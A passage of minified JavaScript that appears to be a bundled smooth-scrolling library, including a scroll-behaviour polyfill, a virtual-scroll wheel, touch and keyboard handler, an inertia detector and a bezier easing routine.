                          !1
                        ));
                  }
                },
              },
              {
                key: "checkEvent",
                value: function (t) {
                  var e = this,
                    r = t.type.replace(this.namespace, ""),
                    i = this.listeners[r];
                  i &&
                    0 !== i.length &&
                    i.forEach(function (t) {
                      switch (r) {
                        case "scroll":
                          return t(e.instance);
                        case "call":
                          return t(e.callValue, e.callWay, e.callObj);
                        default:
                          return t();
                      }
                    });
                },
              },
              { key: "startScroll", value: function () {} },
              { key: "stopScroll", value: function () {} },
              {
                key: "setScroll",
                value: function (t, e) {
                  this.instance.scroll = { x: 0, y: 0 };
                },
              },
              {
                key: "destroy",
                value: function () {
                  var t = this;
                  window.removeEventListener("resize", this.checkResize, !1),
                    Object.keys(this.listeners).forEach(function (e) {
                      t.el.removeEventListener(
                        t.namespace + e,
                        t.checkEvent,
                        !1
                      );
                    }),
                    (this.listeners = {}),
                    this.scrollToEls.forEach(function (e) {
                      e.removeEventListener("click", t.setScrollTo, !1);
                    }),
                    this.html.classList.remove(this.initClass);
                },
              },
            ]),
            t
          );
        })(),
        x =
          "undefined" != typeof globalThis
            ? globalThis
            : "undefined" != typeof window
            ? window
            : void 0 !== t
            ? t
            : "undefined" != typeof self
            ? self
            : {};
      function b(t, e) {
        return t((e = { exports: {} }), e.exports), e.exports;
      }
      var w = b(function (t, e) {
          t.exports = {
            polyfill: function () {
              var t = window,
                e = document;
              if (
                !("scrollBehavior" in e.documentElement.style) ||
                !0 === t.__forceSmoothScrollPolyfill__
              ) {
                var r,
                  i = t.HTMLElement || t.Element,
                  n = {
                    scroll: t.scroll || t.scrollTo,
                    scrollBy: t.scrollBy,
                    elementScroll: i.prototype.scroll || a,
                    scrollIntoView: i.prototype.scrollIntoView,
                  },
                  s =
                    t.performance && t.performance.now
                      ? t.performance.now.bind(t.performance)
                      : Date.now,
                  o =
                    ((r = t.navigator.userAgent),
                    new RegExp(["MSIE ", "Trident/", "Edge/"].join("|")).test(r)
                      ? 1
                      : 0);
                (t.scroll = t.scrollTo =
                  function () {
                    void 0 !== arguments[0] &&
                      (!0 !== l(arguments[0])
                        ? f.call(
                            t,
                            e.body,
                            void 0 !== arguments[0].left
                              ? ~~arguments[0].left
                              : t.scrollX || t.pageXOffset,
                            void 0 !== arguments[0].top
                              ? ~~arguments[0].top
                              : t.scrollY || t.pageYOffset
                          )
                        : n.scroll.call(
                            t,
                            void 0 !== arguments[0].left
                              ? arguments[0].left
                              : "object" != typeof arguments[0]
                              ? arguments[0]
                              : t.scrollX || t.pageXOffset,
                            void 0 !== arguments[0].top
                              ? arguments[0].top
                              : void 0 !== arguments[1]
                              ? arguments[1]
                              : t.scrollY || t.pageYOffset
                          ));
                  }),
                  (t.scrollBy = function () {
                    void 0 !== arguments[0] &&
                      (l(arguments[0])
                        ? n.scrollBy.call(
                            t,
                            void 0 !== arguments[0].left
                              ? arguments[0].left
                              : "object" != typeof arguments[0]
                              ? arguments[0]
                              : 0,
                            void 0 !== arguments[0].top
                              ? arguments[0].top
                              : void 0 !== arguments[1]
                              ? arguments[1]
                              : 0
                          )
                        : f.call(
                            t,
                            e.body,
                            ~~arguments[0].left + (t.scrollX || t.pageXOffset),
                            ~~arguments[0].top + (t.scrollY || t.pageYOffset)
                          ));
                  }),
                  (i.prototype.scroll = i.prototype.scrollTo =
                    function () {
                      if (void 0 !== arguments[0])
                        if (!0 !== l(arguments[0])) {
                          var t = arguments[0].left,
                            e = arguments[0].top;
                          f.call(
                            this,
                            this,
                            void 0 === t ? this.scrollLeft : ~~t,
                            void 0 === e ? this.scrollTop : ~~e
                          );
                        } else {
                          if (
                            "number" == typeof arguments[0] &&
                            void 0 === arguments[1]
                          )
                            throw new SyntaxError(
                              "Value could not be converted"
                            );
                          n.elementScroll.call(
                            this,
                            void 0 !== arguments[0].left
                              ? ~~arguments[0].left
                              : "object" != typeof arguments[0]
                              ? ~~arguments[0]
                              : this.scrollLeft,
                            void 0 !== arguments[0].top
                              ? ~~arguments[0].top
                              : void 0 !== arguments[1]
                              ? ~~arguments[1]
                              : this.scrollTop
                          );
                        }
                    }),
                  (i.prototype.scrollBy = function () {
                    void 0 !== arguments[0] &&
                      (!0 !== l(arguments[0])
                        ? this.scroll({
                            left: ~~arguments[0].left + this.scrollLeft,
                            top: ~~arguments[0].top + this.scrollTop,
                            behavior: arguments[0].behavior,
                          })
                        : n.elementScroll.call(
                            this,
                            void 0 !== arguments[0].left
                              ? ~~arguments[0].left + this.scrollLeft
                              : ~~arguments[0] + this.scrollLeft,
                            void 0 !== arguments[0].top
                              ? ~~arguments[0].top + this.scrollTop
                              : ~~arguments[1] + this.scrollTop
                          ));
                  }),
                  (i.prototype.scrollIntoView = function () {
                    if (!0 !== l(arguments[0])) {
                      var r = (function d(t) {
                          for (; t !== e.body && !1 === c(t); )
                            t = t.parentNode || t.host;
                          return t;
                        })(this),
                        i = r.getBoundingClientRect(),
                        s = this.getBoundingClientRect();
                      r !== e.body
                        ? (f.call(
                            this,
                            r,
                            r.scrollLeft + s.left - i.left,
                            r.scrollTop + s.top - i.top
                          ),
                          "fixed" !== t.getComputedStyle(r).position &&
                            t.scrollBy({
                              left: i.left,
                              top: i.top,
                              behavior: "smooth",
                            }))
                        : t.scrollBy({
                            left: s.left,
                            top: s.top,
                            behavior: "smooth",
                          });
                    } else
                      n.scrollIntoView.call(
                        this,
                        void 0 === arguments[0] || arguments[0]
                      );
                  });
              }
              function a(t, e) {
                (this.scrollLeft = t), (this.scrollTop = e);
              }
              function l(t) {
                if (
                  null === t ||
                  "object" != typeof t ||
                  void 0 === t.behavior ||
                  "auto" === t.behavior ||
                  "instant" === t.behavior
                )
                  return !0;
                if ("object" == typeof t && "smooth" === t.behavior) return !1;
                throw new TypeError(
                  "behavior member of ScrollOptions " +
                    t.behavior +
                    " is not a valid value for enumeration ScrollBehavior."
                );
              }
              function h(t, e) {
                return "Y" === e
                  ? t.clientHeight + o < t.scrollHeight
                  : "X" === e
                  ? t.clientWidth + o < t.scrollWidth
                  : void 0;
              }
              function u(e, r) {
                var i = t.getComputedStyle(e, null)["overflow" + r];
                return "auto" === i || "scroll" === i;
              }
              function c(t) {
                var e = h(t, "Y") && u(t, "Y"),
                  r = h(t, "X") && u(t, "X");
                return e || r;
              }
              function p(e) {
                var r,
                  i,
                  n,
                  o,
                  a = (s() - e.startTime) / 468;
                (o = a = a > 1 ? 1 : a),
                  (r = 0.5 * (1 - Math.cos(Math.PI * o))),
                  (i = e.startX + (e.x - e.startX) * r),
                  (n = e.startY + (e.y - e.startY) * r),
                  e.method.call(e.scrollable, i, n),
                  (i === e.x && n === e.y) ||
                    t.requestAnimationFrame(p.bind(t, e));
              }
              function f(r, i, o) {
                var l,
                  h,
                  u,
                  c,
                  d = s();
                r === e.body
                  ? ((l = t),
                    (h = t.scrollX || t.pageXOffset),
                    (u = t.scrollY || t.pageYOffset),
                    (c = n.scroll))
                  : ((l = r), (h = r.scrollLeft), (u = r.scrollTop), (c = a)),
                  p({
                    scrollable: l,
                    method: c,
                    startTime: d,
                    startX: h,
                    startY: u,
                    x: i,
                    y: o,
                  });
              }
            },
          };
        }),
        T =
          (w.polyfill,
          (function (t) {
            l(i, t);
            var e = p(i);
            function i() {
              var t,
                n =
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : {};
              return (
                r(this, i),
                (t = e.call(this, n)).resetNativeScroll &&
                  (history.scrollRestoration &&
                    (history.scrollRestoration = "manual"),
                  window.scrollTo(0, 0)),
                window.addEventListener("scroll", t.checkScroll, !1),
                void 0 === window.smoothscrollPolyfill &&
                  ((window.smoothscrollPolyfill = w),
                  window.smoothscrollPolyfill.polyfill()),
                t
              );
            }
            return (
              n(i, [
                {
                  key: "init",
                  value: function () {
                    (this.instance.scroll.y = window.pageYOffset),
                      this.addElements(),
                      this.detectElements(),
                      f(h(i.prototype), "init", this).call(this);
                  },
                },
                {
                  key: "checkScroll",
                  value: function () {
                    var t = this;
                    f(h(i.prototype), "checkScroll", this).call(this),
                      this.getDirection && this.addDirection(),
                      this.getSpeed &&
                        (this.addSpeed(), (this.speedTs = Date.now())),
                      (this.instance.scroll.y = window.pageYOffset),
                      Object.entries(this.els).length &&
                        (this.hasScrollTicking ||
                          (requestAnimationFrame(function () {
                            t.detectElements();
                          }),
                          (this.hasScrollTicking = !0)));
                  },
                },
                {
                  key: "addDirection",
                  value: function () {
                    window.pageYOffset > this.instance.scroll.y
                      ? "down" !== this.instance.direction &&
                        (this.instance.direction = "down")
                      : window.pageYOffset < this.instance.scroll.y &&
                        "up" !== this.instance.direction &&
                        (this.instance.direction = "up");
                  },
                },
                {
                  key: "addSpeed",
                  value: function () {
                    window.pageYOffset != this.instance.scroll.y
                      ? (this.instance.speed =
                          (window.pageYOffset - this.instance.scroll.y) /
                          Math.max(1, Date.now() - this.speedTs))
                      : (this.instance.speed = 0);
                  },
                },
                {
                  key: "resize",
                  value: function () {
                    Object.entries(this.els).length &&
                      ((this.windowHeight = window.innerHeight),
                      this.updateElements());
                  },
                },
                {
                  key: "addElements",
                  value: function () {
                    var t = this;
                    (this.els = {}),
                      this.el
                        .querySelectorAll("[data-" + this.name + "]")
                        .forEach(function (e, r) {
                          e.getBoundingClientRect();
                          var i,
                            n,
                            s,
                            o = e.dataset[t.name + "Class"] || t.class,
                            a =
                              "string" == typeof e.dataset[t.name + "Id"]
                                ? e.dataset[t.name + "Id"]
                                : r,
                            l =
                              "string" == typeof e.dataset[t.name + "Offset"]
                                ? e.dataset[t.name + "Offset"].split(",")
                                : t.offset,
                            h = e.dataset[t.name + "Repeat"],
                            u = e.dataset[t.name + "Call"],
                            c = e.dataset[t.name + "Target"],
                            d = (s =
                              void 0 !== c
                                ? document.querySelector("".concat(c))
                                : e).getBoundingClientRect();
                          (i = d.top + t.instance.scroll.y),
                            (n = d.left + t.instance.scroll.x);
                          var p = i + s.offsetHeight,
                            f = n + s.offsetWidth;
                          h = "false" != h && (null != h || t.repeat);
                          var g = t.getRelativeOffset(l),
                            m = {
                              el: e,
                              targetEl: s,
                              id: a,
                              class: o,
                              top: (i += g[0]),
                              bottom: (p -= g[1]),
                              left: n,
                              right: f,
                              offset: l,
                              progress: 0,
                              repeat: h,
                              inView: !1,
                              call: u,
                            };
                          (t.els[a] = m),
                            e.classList.contains(o) && t.setInView(t.els[a], a);
                        });
                  },
                },
                {
                  key: "updateElements",
                  value: function () {
                    var t = this;
                    Object.entries(this.els).forEach(function (e) {
                      var r = g(e, 2),
                        i = r[0],
                        n = r[1],
                        s =
                          n.targetEl.getBoundingClientRect().top +
                          t.instance.scroll.y,
                        o = s + n.targetEl.offsetHeight,
                        a = t.getRelativeOffset(n.offset);
                      (t.els[i].top = s + a[0]), (t.els[i].bottom = o - a[1]);
                    }),
                      (this.hasScrollTicking = !1);
                  },
                },
                {
                  key: "getRelativeOffset",
                  value: function (t) {
                    var e = [0, 0];
                    if (t)
                      for (var r = 0; r < t.length; r++)
                        "string" == typeof t[r]
                          ? t[r].includes("%")
                            ? (e[r] = parseInt(
                                (t[r].replace("%", "") * this.windowHeight) /
                                  100
                              ))
                            : (e[r] = parseInt(t[r]))
                          : (e[r] = t[r]);
                    return e;
                  },
                },
                {
                  key: "scrollTo",
                  value: function (t) {
                    var e =
                        arguments.length > 1 && void 0 !== arguments[1]
                          ? arguments[1]
                          : {},
                      r = parseInt(e.offset) || 0,
                      i = !!e.callback && e.callback;
                    if ("string" == typeof t) {
                      if ("top" === t) t = this.html;
                      else if ("bottom" === t)
                        t = this.html.offsetHeight - window.innerHeight;
                      else if (!(t = document.querySelector(t))) return;
                    } else if ("number" == typeof t) t = parseInt(t);
                    else if (!t || !t.tagName)
                      return void console.warn(
                        "`target` parameter is not valid"
                      );
                    if (
                      ((r =
                        "number" != typeof t
                          ? t.getBoundingClientRect().top +
                            r +
                            this.instance.scroll.y
                          : t + r),
                      i)
                    ) {
                      r = r.toFixed();
                      window.addEventListener("scroll", function t() {
                        window.pageYOffset.toFixed() === r &&
                          (window.removeEventListener("scroll", t), i());
                      });
                    }
                    window.scrollTo({ top: r, behavior: "smooth" });
                  },
                },
                {
                  key: "update",
                  value: function () {
                    this.addElements(), this.detectElements();
                  },
                },
                {
                  key: "destroy",
                  value: function () {
                    f(h(i.prototype), "destroy", this).call(this),
                      window.removeEventListener(
                        "scroll",
                        this.checkScroll,
                        !1
                      );
                  },
                },
              ]),
              i
            );
          })(D)),
        S = Object.getOwnPropertySymbols,
        E = Object.prototype.hasOwnProperty,
        C = Object.prototype.propertyIsEnumerable;
      var F = (function () {
        try {
          if (!Object.assign) return !1;
          var t = new String("abc");
          if (((t[5] = "de"), "5" === Object.getOwnPropertyNames(t)[0]))
            return !1;
          for (var e = {}, r = 0; r < 10; r++)
            e["_" + String.fromCharCode(r)] = r;
          if (
            "0123456789" !==
            Object.getOwnPropertyNames(e)
              .map(function (t) {
                return e[t];
              })
              .join("")
          )
            return !1;
          var i = {};
          return (
            "abcdefghijklmnopqrst".split("").forEach(function (t) {
              i[t] = t;
            }),
            "abcdefghijklmnopqrst" ===
              Object.keys(Object.assign({}, i)).join("")
          );
        } catch (t) {
          return !1;
        }
      })()
        ? Object.assign
        : function (t, e) {
            for (
              var r,
                i,
                n = (function P(t) {
                  if (null == t)
                    throw new TypeError(
                      "Object.assign cannot be called with null or undefined"
                    );
                  return Object(t);
                })(t),
                s = 1;
              s < arguments.length;
              s++
            ) {
              for (var o in (r = Object(arguments[s])))
                E.call(r, o) && (n[o] = r[o]);
              if (S) {
                i = S(r);
                for (var a = 0; a < i.length; a++)
                  C.call(r, i[a]) && (n[i[a]] = r[i[a]]);
              }
            }
            return n;
          };
      function M() {}
      M.prototype = {
        on: function (t, e, r) {
          var i = this.e || (this.e = {});
          return (i[t] || (i[t] = [])).push({ fn: e, ctx: r }), this;
        },
        once: function (t, e, r) {
          var i = this;
          function n() {
            i.off(t, n), e.apply(r, arguments);
          }
          return (n._ = e), this.on(t, n, r);
        },
        emit: function (t) {
          for (
            var e = [].slice.call(arguments, 1),
              r = ((this.e || (this.e = {}))[t] || []).slice(),
              i = 0,
              n = r.length;
            i < n;
            i++
          )
            r[i].fn.apply(r[i].ctx, e);
          return this;
        },
        off: function (t, e) {
          var r = this.e || (this.e = {}),
            i = r[t],
            n = [];
          if (i && e)
            for (var s = 0, o = i.length; s < o; s++)
              i[s].fn !== e && i[s].fn._ !== e && n.push(i[s]);
          return n.length ? (r[t] = n) : delete r[t], this;
        },
      };
      var R = M,
        A = b(function (t, e) {
          (function () {
            (null !== e ? e : this).Lethargy = (function () {
              function t(t, e, r, i) {
                (this.stability = null != t ? Math.abs(t) : 8),
                  (this.sensitivity = null != e ? 1 + Math.abs(e) : 100),
                  (this.tolerance = null != r ? 1 + Math.abs(r) : 1.1),
                  (this.delay = null != i ? i : 150),
                  (this.lastUpDeltas = function () {
                    var t, e, r;
                    for (
                      r = [], t = 1, e = 2 * this.stability;
                      1 <= e ? t <= e : t >= e;
                      1 <= e ? t++ : t--
                    )
                      r.push(null);
                    return r;
                  }.call(this)),
                  (this.lastDownDeltas = function () {
                    var t, e, r;
                    for (
                      r = [], t = 1, e = 2 * this.stability;
                      1 <= e ? t <= e : t >= e;
                      1 <= e ? t++ : t--
                    )
                      r.push(null);
                    return r;
                  }.call(this)),
                  (this.deltasTimestamp = function () {
                    var t, e, r;
                    for (
                      r = [], t = 1, e = 2 * this.stability;
                      1 <= e ? t <= e : t >= e;
                      1 <= e ? t++ : t--
                    )
                      r.push(null);
                    return r;
                  }.call(this));
              }
              return (
                (t.prototype.check = function (t) {
                  var e;
                  return (
                    null != (t = t.originalEvent || t).wheelDelta
                      ? (e = t.wheelDelta)
                      : null != t.deltaY
                      ? (e = -40 * t.deltaY)
                      : (null == t.detail && 0 !== t.detail) ||
                        (e = -40 * t.detail),
                    this.deltasTimestamp.push(Date.now()),
                    this.deltasTimestamp.shift(),
                    e > 0
                      ? (this.lastUpDeltas.push(e),
                        this.lastUpDeltas.shift(),
                        this.isInertia(1))
                      : (this.lastDownDeltas.push(e),
                        this.lastDownDeltas.shift(),
                        this.isInertia(-1))
                  );
                }),
                (t.prototype.isInertia = function (t) {
                  var e, r, i, n, s, o, a;
                  return null ===
                    (e = -1 === t ? this.lastDownDeltas : this.lastUpDeltas)[0]
                    ? t
                    : !(
                        this.deltasTimestamp[2 * this.stability - 2] +
                          this.delay >
                          Date.now() && e[0] === e[2 * this.stability - 1]
                      ) &&
                        ((i = e.slice(0, this.stability)),
                        (r = e.slice(this.stability, 2 * this.stability)),
                        (a = i.reduce(function (t, e) {
                          return t + e;
                        })),
                        (s = r.reduce(function (t, e) {
                          return t + e;
                        })),
                        (o = a / i.length),
                        (n = s / r.length),
                        Math.abs(o) < Math.abs(n * this.tolerance) &&
                          this.sensitivity < Math.abs(n) &&
                          t);
                }),
                (t.prototype.showLastUpDeltas = function () {
                  return this.lastUpDeltas;
                }),
                (t.prototype.showLastDownDeltas = function () {
                  return this.lastDownDeltas;
                }),
                t
              );
            })();
          }).call(x);
        }),
        O_hasWheelEvent = "onwheel" in document,
        O_hasMouseWheelEvent = "onmousewheel" in document,
        O_hasTouch =
          "ontouchstart" in window ||
          window.TouchEvent ||
          (window.DocumentTouch && document instanceof DocumentTouch),
        O_hasTouchWin =
          navigator.msMaxTouchPoints && navigator.msMaxTouchPoints > 1,
        O_hasPointer = !!window.navigator.msPointerEnabled,
        O_hasKeyDown = "onkeydown" in document,
        O_isFirefox = navigator.userAgent.indexOf("Firefox") > -1,
        k = Object.prototype.toString,
        L = Object.prototype.hasOwnProperty;
      function B(t, e) {
        return function () {
          return t.apply(e, arguments);
        };
      }
      var z = A.Lethargy,
        I = "virtualscroll",
        j = q;
      function q(t) {
        !(function (t) {
          if (!t)
            return console.warn("bindAll requires at least one argument.");
          var e = Array.prototype.slice.call(arguments, 1);
          if (0 === e.length)
            for (var r in t)
              L.call(t, r) &&
                "function" == typeof t[r] &&
                "[object Function]" == k.call(t[r]) &&
                e.push(r);
          for (var i = 0; i < e.length; i++) {
            var n = e[i];
            t[n] = B(t[n], t);
          }
        })(
          this,
          "_onWheel",
          "_onMouseWheel",
          "_onTouchStart",
          "_onTouchMove",
          "_onKeyDown"
        ),
          (this.el = window),
          t && t.el && ((this.el = t.el), delete t.el),
          (this.options = F(
            {
              mouseMultiplier: 1,
              touchMultiplier: 2,
              firefoxMultiplier: 15,
              keyStep: 120,
              preventTouch: !1,
              unpreventTouchClass: "vs-touchmove-allowed",
              limitInertia: !1,
              useKeyboard: !0,
              useTouch: !0,
            },
            t
          )),
          this.options.limitInertia && (this._lethargy = new z()),
          (this._emitter = new R()),
          (this._event = { y: 0, x: 0, deltaX: 0, deltaY: 0 }),
          (this.touchStartX = null),
          (this.touchStartY = null),
          (this.bodyTouchAction = null),
          void 0 !== this.options.passive &&
            (this.listenerOptions = { passive: this.options.passive });
      }
      function X(t, e, r) {
        return (1 - r) * t + r * e;
      }
      function Y(t) {
        var e = {};
        if (window.getComputedStyle) {
          var r = getComputedStyle(t),
            i = r.transform || r.webkitTransform || r.mozTransform,
            n = i.match(/^matrix3d\((.+)\)$/);
          return (
            n
              ? ((e.x = n ? parseFloat(n[1].split(", ")[12]) : 0),
                (e.y = n ? parseFloat(n[1].split(", ")[13]) : 0))
              : ((n = i.match(/^matrix\((.+)\)$/)),
                (e.x = n ? parseFloat(n[1].split(", ")[4]) : 0),
                (e.y = n ? parseFloat(n[1].split(", ")[5]) : 0)),
            e
          );
        }
      }
      function G(t) {
        for (var e = []; t && t !== document; t = t.parentNode) e.push(t);
        return e;
      }
      (q.prototype._notify = function (t) {
        var e = this._event;
        (e.x += e.deltaX),
          (e.y += e.deltaY),
          this._emitter.emit(I, {
            x: e.x,
            y: e.y,
            deltaX: e.deltaX,
            deltaY: e.deltaY,
            originalEvent: t,
          });
      }),
        (q.prototype._onWheel = function (t) {
          var e = this.options;
          if (!this._lethargy || !1 !== this._lethargy.check(t)) {
            var r = this._event;
            (r.deltaX = t.wheelDeltaX || -1 * t.deltaX),
              (r.deltaY = t.wheelDeltaY || -1 * t.deltaY),
              O_isFirefox &&
                1 == t.deltaMode &&
                ((r.deltaX *= e.firefoxMultiplier),
                (r.deltaY *= e.firefoxMultiplier)),
              (r.deltaX *= e.mouseMultiplier),
              (r.deltaY *= e.mouseMultiplier),
              this._notify(t);
          }
        }),
        (q.prototype._onMouseWheel = function (t) {
          if (!this.options.limitInertia || !1 !== this._lethargy.check(t)) {
            var e = this._event;
            (e.deltaX = t.wheelDeltaX ? t.wheelDeltaX : 0),
              (e.deltaY = t.wheelDeltaY ? t.wheelDeltaY : t.wheelDelta),
              this._notify(t);
          }
        }),
        (q.prototype._onTouchStart = function (t) {
          var e = t.targetTouches ? t.targetTouches[0] : t;
          (this.touchStartX = e.pageX), (this.touchStartY = e.pageY);
        }),
        (q.prototype._onTouchMove = function (t) {
          var e = this.options;
          e.preventTouch &&
            !t.target.classList.contains(e.unpreventTouchClass) &&
            t.preventDefault();
          var r = this._event,
            i = t.targetTouches ? t.targetTouches[0] : t;
          (r.deltaX = (i.pageX - this.touchStartX) * e.touchMultiplier),
            (r.deltaY = (i.pageY - this.touchStartY) * e.touchMultiplier),
            (this.touchStartX = i.pageX),
            (this.touchStartY = i.pageY),
            this._notify(t);
        }),
        (q.prototype._onKeyDown = function (t) {
          var e = this._event;
          e.deltaX = e.deltaY = 0;
          var r = window.innerHeight - 40;
          switch (t.keyCode) {
            case 37:
            case 38:
              e.deltaY = this.options.keyStep;
              break;
            case 39:
            case 40:
              e.deltaY = -this.options.keyStep;
              break;
            case t.shiftKey:
              e.deltaY = r;
              break;
            case 32:
              e.deltaY = -r;
              break;
            default:
              return;
          }
          this._notify(t);
        }),
        (q.prototype._bind = function () {
          O_hasWheelEvent &&
            this.el.addEventListener(
              "wheel",
              this._onWheel,
              this.listenerOptions
            ),
            O_hasMouseWheelEvent &&
              this.el.addEventListener(
                "mousewheel",
                this._onMouseWheel,
                this.listenerOptions
              ),
            O_hasTouch &&
              this.options.useTouch &&
              (this.el.addEventListener(
                "touchstart",
                this._onTouchStart,
                this.listenerOptions
              ),
              this.el.addEventListener(
                "touchmove",
                this._onTouchMove,
                this.listenerOptions
              )),
            O_hasPointer &&
              O_hasTouchWin &&
              ((this.bodyTouchAction = document.body.style.msTouchAction),
              (document.body.style.msTouchAction = "none"),
              this.el.addEventListener("MSPointerDown", this._onTouchStart, !0),
              this.el.addEventListener("MSPointerMove", this._onTouchMove, !0)),
            O_hasKeyDown &&
              this.options.useKeyboard &&
              document.addEventListener("keydown", this._onKeyDown);
        }),
        (q.prototype._unbind = function () {
          O_hasWheelEvent &&
            this.el.removeEventListener("wheel", this._onWheel),
            O_hasMouseWheelEvent &&
              this.el.removeEventListener("mousewheel", this._onMouseWheel),
            O_hasTouch &&
              (this.el.removeEventListener("touchstart", this._onTouchStart),
              this.el.removeEventListener("touchmove", this._onTouchMove)),
            O_hasPointer &&
              O_hasTouchWin &&
              ((document.body.style.msTouchAction = this.bodyTouchAction),
              this.el.removeEventListener(
                "MSPointerDown",
                this._onTouchStart,
                !0
              ),
              this.el.removeEventListener(
                "MSPointerMove",
                this._onTouchMove,
                !0
              )),
            O_hasKeyDown &&
              this.options.useKeyboard &&
              document.removeEventListener("keydown", this._onKeyDown);
        }),
        (q.prototype.on = function (t, e) {
          this._emitter.on(I, t, e);
          var r = this._emitter.e;
          r && r[I] && 1 === r[I].length && this._bind();
        }),
        (q.prototype.off = function (t, e) {
          this._emitter.off(I, t, e);
          var r = this._emitter.e;
          (!r[I] || r[I].length <= 0) && this._unbind();
        }),
        (q.prototype.reset = function () {
          var t = this._event;
          (t.x = 0), (t.y = 0);
        }),
        (q.prototype.destroy = function () {
          this._emitter.off(), this._unbind();
        });
      var K = "function" == typeof Float32Array;
      function Q(t, e) {
        return 1 - 3 * e + 3 * t;
      }
      function Z(t, e) {
        return 3 * e - 6 * t;
      }
      function $(t) {
        return 3 * t;
      }
      function J(t, e, r) {
        return ((Q(e, r) * t + Z(e, r)) * t + $(e)) * t;
      }
      function tt(t, e, r) {
        return 3 * Q(e, r) * t * t + 2 * Z(e, r) * t + $(e);
      }
      function et(t) {
        return t;
      }
      var rt = function (t, e, r, i) {
          if (!(0 <= t && t <= 1 && 0 <= r && r <= 1))
            throw new Error("bezier x values must be in [0, 1] range");
          if (t === e && r === i) return et;
          for (
            var n = K ? new Float32Array(11) : new Array(11), s = 0;
            s < 11;
            ++s
          )
            n[s] = J(0.1 * s, t, r);
          function o(e) {
            for (var i = 0, s = 1; 10 !== s && n[s] <= e; ++s) i += 0.1;
            --s;
            var o = i + ((e - n[s]) / (n[s + 1] - n[s])) * 0.1,
              a = tt(o, t, r);
            return a >= 0.001
              ? (function (t, e, r, i) {
                  for (var n = 0; n < 4; ++n) {
                    var s = tt(e, r, i);
                    if (0 === s) return e;
                    e -= (J(e, r, i) - t) / s;
                  }
                  return e;
                })(e, o, t, r)
              : 0 === a
              ? o
              : (function (t, e, r, i, n) {
                  var s,
                    o,
                    a = 0;
                  do {
                    (s = J((o = e + (r - e) / 2), i, n) - t) > 0
                      ? (r = o)
                      : (e = o);
                  } while (Math.abs(s) > 1e-7 && ++a < 10);
                  return o;
                })(e, i, i + 0.1, t, r);
          }
          return function (t) {
            return 0 === t ? 0 : 1 === t ? 1 : J(o(t), e, i);
          };
        },
        ct = (function (t) {
          l(i, t);
          var e = p(i);
          function i() {
            var t,
              n =
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : {};
            return (
              r(this, i),
              history.scrollRestoration &&
                (history.scrollRestoration = "manual"),
              window.scrollTo(0, 0),
              (t = e.call(this, n)).inertia && (t.lerp = 0.1 * t.inertia),
              (t.isScrolling = !1),
              (t.isDraggingScrollbar = !1),
              (t.isTicking = !1),
              (t.hasScrollTicking = !1),
              (t.parallaxElements = {}),
              (t.stop = !1),
              (t.scrollbarContainer = n.scrollbarContainer),
              (t.checkKey = t.checkKey.bind(c(t))),
              window.addEventListener("keydown", t.checkKey, !1),
              t
            );
          }
          return (
            n(i, [
              {
                key: "init",
                value: function () {
                  var t = this;
                  this.html.classList.add(this.smoothClass),
                    this.html.setAttribute(
                      "data-".concat(this.name, "-direction"),
                      this.direction
                    ),
                    (this.instance = a(
                      {
                        delta: {
                          x: this.initPosition.x,
                          y: this.initPosition.y,
                        },
                        scroll: {
                          x: this.initPosition.x,
                          y: this.initPosition.y,
                        },
                      },
                      this.instance
                    )),
                    (this.vs = new j({
                      el: this.scrollFromAnywhere ? document : this.el,
                      mouseMultiplier:
                        navigator.platform.indexOf("Win") > -1 ? 1 : 0.4,
                      firefoxMultiplier: this.firefoxMultiplier,
                      touchMultiplier: this.touchMultiplier,
                      useKeyboard: !1,
                      passive: !0,
                    })),
                    this.vs.on(function (e) {
                      t.stop ||
                        t.isDraggingScrollbar ||
                        requestAnimationFrame(function () {
                          t.updateDelta(e), t.isScrolling || t.startScrolling();
                        });
                    }),
                    this.setScrollLimit(),
                    this.initScrollBar(),
                    this.addSections(),
                    this.addElements(),
                    this.checkScroll(!0),
                    this.transformElements(!0, !0),
                    f(h(i.prototype), "init", this).call(this);
                },
              },
              {
                key: "setScrollLimit",
                value: function () {
                  if (
                    ((this.instance.limit.y =
                      this.el.offsetHeight - this.windowHeight),
                    "horizontal" === this.direction)
                  ) {
                    for (
                      var t = 0, e = this.el.children, r = 0;
                      r < e.length;
                      r++
                    )
                      t += e[r].offsetWidth;
                    this.instance.limit.x = t - this.windowWidth;
                  }
                },
              },
              {
                key: "startScrolling",
                value: function () {
                  (this.startScrollTs = Date.now()),
                    (this.isScrolling = !0),
                    this.checkScroll(),
                    this.html.classList.add(this.scrollingClass);
                },
              },
              {
                key: "stopScrolling",
                value: function () {
                  cancelAnimationFrame(this.checkScrollRaf),
                    this.scrollToRaf &&
                      (cancelAnimationFrame(this.scrollToRaf),
                      (this.scrollToRaf = null)),
                    (this.isScrolling = !1),
                    (this.instance.scroll.y = Math.round(
                      this.instance.scroll.y
                    )),
                    this.html.classList.remove(this.scrollingClass);
                },
              },
              {
                key: "checkKey",
                value: function (t) {
                  var e = this;
                  if (this.stop)
                    9 == t.keyCode &&
                      requestAnimationFrame(function () {
                        (e.html.scrollTop = 0),
                          (document.body.scrollTop = 0),
                          (e.html.scrollLeft = 0),
                          (document.body.scrollLeft = 0);
                      });
                  else {
                    switch (t.keyCode) {
                      case 9:
                        requestAnimationFrame(function () {
                          (e.html.scrollTop = 0),
                            (document.body.scrollTop = 0),
                            (e.html.scrollLeft = 0),
                            (document.body.scrollLeft = 0),
                            e.scrollTo(document.activeElement, {
                              offset: -window.innerHeight / 2,
                            });
                        });
                        break;
                      case 38:
                        this.instance.delta[this.directionAxis] -= 240;
                        break;
                      case 40:
                        this.instance.delta[this.directionAxis] += 240;
                        break;
                      case 33:
                        this.instance.delta[this.directionAxis] -=
                          window.innerHeight;
                        break;
                      case 34:
                        this.instance.delta[this.directionAxis] +=
                          window.innerHeight;
                        break;
                      case 36:
                        this.instance.delta[this.directionAxis] -=
                          this.instance.limit[this.directionAxis];
                        break;
                      case 35:
                        this.instance.delta[this.directionAxis] +=
                          this.instance.limit[this.directionAxis];
                        break;
                      case 32:
                        document.activeElement instanceof HTMLInputElement ||
                          document.activeElement instanceof
                            HTMLTextAreaElement ||
                          (t.shiftKey
                            ? (this.instance.delta[this.directionAxis] -=
                                window.innerHeight)
                            : (this.instance.delta[this.directionAxis] +=
                                window.innerHeight));
                        break;
                      default:
                        return;
                    }
                    this.instance.delta[this.directionAxis] < 0 &&
                      (this.instance.delta[this.directionAxis] = 0),
                      this.instance.delta[this.directionAxis] >
